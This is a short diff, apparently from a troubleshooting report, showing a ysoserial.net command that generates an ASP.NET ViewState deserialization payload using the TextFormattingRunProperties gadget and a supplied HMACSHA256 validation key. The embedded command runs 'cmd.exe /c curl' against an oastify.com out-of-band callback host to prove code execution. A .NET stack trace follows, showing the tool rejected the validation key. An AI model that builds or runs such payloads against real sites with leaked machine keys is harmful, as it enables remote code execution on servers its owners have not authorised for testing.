@@ -1,2 +1,11 @@
-ysoserial.exe -p ViewState -g TextFormattingRunProperties ` -c "cmd.exe /c curl -sk https://143on5ik36mb3fq6alehtop5qwwpkf84.oastify.com/pwned" ' --generator="4E85D818" `--islegacy `--validationalg="HMACSHA256" `--validationkey="07B0975D7BEF2DAD02AB1525BD5EE167ADF820099B208659E4FF246F9AF92418A25A1994359A286397ACED3A9BAED040E45443D988AD4489930897A274D85D9E" `-o base64
+>ysoserial.exe -p ViewState -g TextFormattingRunProperties ` -c "cmd.exe /c curl -sk https://143on5ik36mb3fq6alehtop5qwwpkf84.oastify.com/pwned" ' --generator="4E85D818" `--islegacy `--validationalg="HMACSHA256" `--validationkey="07B0975D7BEF2DAD02AB1525BD5EE167ADF820099B208659E4FF246F9AF92418A25A1994359A286397ACED3A9BAED040E45443D988AD4489930897A274D85D9E" `-o base64
 
+Unhandled Exception: System.Configuration.ConfigurationErrorsException: The value for the property 'validationKey' is not valid. The error is: The string must be at least 1 characters long. ---> System.ArgumentException: The string must be at least 1 characters long.
+   at System.Configuration.StringValidator.Validate(Object value)
+   at System.Configuration.ConfigurationProperty.Validate(Object value)
+   --- End of inner exception stack trace ---
+   at System.Configuration.ConfigurationProperty.Validate(Object value)
+   at System.Configuration.ConfigurationElement.SetPropertyValue(ConfigurationProperty prop, Object value, Boolean ignoreLocks)
+   at System.Web.Configuration.MachineKeySection.set_ValidationKey(String value)
+   at ysoserial.Plugins.ViewStatePlugin.Run(String[] args) in D:\a\ysoserial.net\ysoserial.net\ysoserial\Plugins\ViewStatePlugin.cs:line 285
+   at ysoserial.Program.Main(String[] args) in D:\a\ysoserial.net\ysoserial.net\ysoserial\Program.cs:line 169
